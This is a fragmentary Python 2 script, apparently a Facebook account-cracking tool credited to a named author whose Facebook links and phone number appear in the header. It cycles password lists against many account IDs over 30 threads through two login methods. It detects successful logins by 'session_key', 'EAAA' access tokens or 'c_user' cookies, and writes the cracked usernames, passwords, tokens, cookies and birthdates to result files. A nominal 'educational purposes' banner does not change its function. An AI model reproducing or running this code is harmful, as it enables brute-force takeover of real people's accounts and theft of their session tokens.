...
"""%s
 ...
 - author      : Mahadi Hasan Afridi
 - facebook    : https://www.facebook.com/4FR1D1.V4U
 - fanspage    : https://www.facebook.com/𝐒𝐇𝐄𝐈𝐊𝐇-𝐒𝐇𝐀𝐉𝐈𝐃-𝐀𝐇𝐌𝐄𝐃-110703921118360/
 - whatsap     : +8801818502669
...
def banner():
	print (''' %s 
 MAHADI-HASAN-AFRIDI%s \n This Tools is Only For Educational Purposes \n Do Not Use For Illigal Purposes%s> %sMAHADI \n We Are Trying To Play Against System%s> %sMAHADI\n Stay With Us%s>%s Facebook \n Thank You %s>%sWorld\n %s[%s*%s] By : %sMAHADI HASAN \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
...
class ngentod:
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n %s[%s*%s] MAHADI %sON %sResult save to >%s MAHADI/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] MAHADI %sOFF %sResult save to > %s MAHADI/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            ...
                            print '\n %s[%s*%s] MAHADI %sON%sResult save to >%s MAHADI/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] MAHADI %sOFF %sResult save to > %sMAHADI/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                    ...
                    print ' [%s01%s] B-API Method (MAHADI-PRO)'%(K,P)
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n%s [%s*%s] MAHADI %sON%sResult save to >%s MAHADI/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] MAHADI %sOFF %Result save to > %s MAHADI/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
    ...
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %sMAHADI-OFF %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('MAHADI/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
                ...
                try:
                    ...
                    month = bulan1[month]
                    print '\r %sMAHADI-OFF %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('MAHADI/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                print '\r %sMAHADI-OFF %s ◊ %s           ' % (K,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('MAHADI/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
    ...
    def basic(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %sMAHADI-OFF %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
